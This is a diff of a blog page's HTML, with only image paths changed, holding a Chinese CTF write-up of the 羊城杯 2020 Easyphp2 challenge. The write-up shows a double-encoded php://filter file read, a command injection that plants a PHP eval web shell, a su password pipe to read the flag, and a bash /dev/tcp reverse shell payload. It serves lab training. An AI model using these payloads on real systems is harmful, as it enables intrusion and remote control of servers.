@@ -611,11 +611,11 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[su|伪协议|二次编码伪协议]</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921172547035.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921172547035.png"></p>
 <h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>看robots.txt</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921172557618.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921172557618.png"></p>
 <p>然后用伪协议，有过滤。</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921172759397.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921172759397.png"></p>
 <p>二次编码绕过</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.%2562%2561%2573%2565%2536%2534-encode/resource=GWHT.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -654,29 +654,29 @@
 <p>很明显了，把cookie改为GWHT，然后写个马</p>
 <pre class="line-numbers language-none"><code class="language-none">1&#39;|echo &quot;&lt;?&#x3D;@eval(\$_POST[cmd])?&gt;&quot;&gt;&#39;1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921180209809.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921180209809.png"></p>
 <p>进蚁剑，找了找</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921180927522.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921180927522.png"></p>
 <p>权限不够</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921180950522.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921180950522.png"></p>
 <p>怪，还搜索不到，可能是权限不够就中断了。</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921181123009.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921181123009.png"></p>
 <p>文件需要GWHT</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921182455114.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921182455114.png"></p>
 <p>这有个hash</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921181218999.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921181218999.png"></p>
 <p>解码为GWHTCTF</p>
 <p>在蚁剑中可以这样登录并执行命令</p>
 <pre class="line-numbers language-none"><code class="language-none">printf &quot;GWHTCTF&quot; | su - GWHT -c &#39;cat &#x2F;GWHT&#x2F;system&#x2F;of&#x2F;a&#x2F;down&#x2F;flag.txt&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921181525055.png" alt="、"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921181525055.png" alt="、"></p>
 <p>也可以反弹shell</p>
 <p>payload：</p>
 <pre class="line-numbers language-none"><code class="language-none">1&#39;&amp;&amp;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;9999 0&gt;&amp;1&quot;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <pre class="line-numbers language-none"><code class="language-none">su - GWHT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921183446130.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921183446130.png"></p>
 
                 
             </div>
